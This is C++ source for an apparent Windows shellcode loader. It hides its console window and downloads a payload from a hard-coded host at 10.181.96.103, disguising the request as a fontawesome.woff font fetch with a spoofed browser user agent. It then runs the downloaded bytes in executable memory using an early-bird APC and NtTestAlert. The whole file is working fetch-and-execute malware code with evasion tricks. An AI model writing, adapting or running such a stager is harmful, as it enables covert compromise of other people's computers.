#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment (lib, "Wininet.lib")
#pragma comment(lib, "ntdll")
using alert = NTSTATUS(NTAPI*)();


struct sc {
    BYTE* pcData;
    DWORD dwSize;
};


BOOL Download(LPCWSTR host, INTERNET_PORT port, sc* scc);
BOOL squirt(sc scc);


int main() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window , SW_HIDE);

    struct sc scc;
    if (!Download(L"10.181.96.103", 80, &scc)) { return 2; }

    if (!squirt(scc)) { return 3; }

    return 0;
}

//  Getting the scc  //

BOOL Download(LPCWSTR host, INTERNET_PORT port, sc* scc) {
    HINTERNET session = InternetOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0);

    HINTERNET connection = InternetConnect(
        session,
        host,
        port,
        L"",
        L"",
        INTERNET_SERVICE_HTTP,
        0,
        0);

    HINTERNET request = HttpOpenRequest(
        connection,
        L"GET",
        L"/css/fonts/fontawesome.woff",
        NULL,
        NULL,
        NULL,
        0,
        0);

    WORD counter = 0;
    while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
        counter++;
        Sleep(3000);
        if (counter >= 3) {
            return 0; // HTTP requests eventually failed
        }
    }

    DWORD bufSize = BUFSIZ;
    BYTE* buffer = new BYTE[bufSize];

    DWORD capacity = bufSize;
    BYTE* payload = (BYTE*)malloc(capacity);

    DWORD payloadSize = 0;

    while (true) {
        DWORD bytesRead;

        if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
            return 0;
        }

        if (bytesRead == 0) break;

        if (payloadSize + bytesRead > capacity) {
            capacity *= 2;
            BYTE* newPayload = (BYTE*)realloc(payload, capacity);
            payload = newPayload;
        }

        for (DWORD i = 0; i < bytesRead; i++) {
            payload[payloadSize++] = buffer[i];
        }

    }
    BYTE* newPayload = (BYTE*)realloc(payload, payloadSize);

    InternetCloseHandle(request);
    InternetCloseHandle(connection);
    InternetCloseHandle(session);
    (*scc).pcData = payload;
    (*scc).dwSize = payloadSize;
    return 1;
}


//  Use early bird APC + NTTestAlert to load sc  //

BOOL squirt(sc scc) {
    // set up the alert
    alert testAlert = (alert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
    // allocate memory to the process
    LPVOID shellAddress = VirtualAlloc(NULL, scc.dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // write the sc to the process
    WriteProcessMemory(GetCurrentProcess(), shellAddress, scc.pcData, scc.dwSize, NULL);
    // queue the APC to the thread
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
    // Issues the alert
    testAlert();
  

    return 0;
}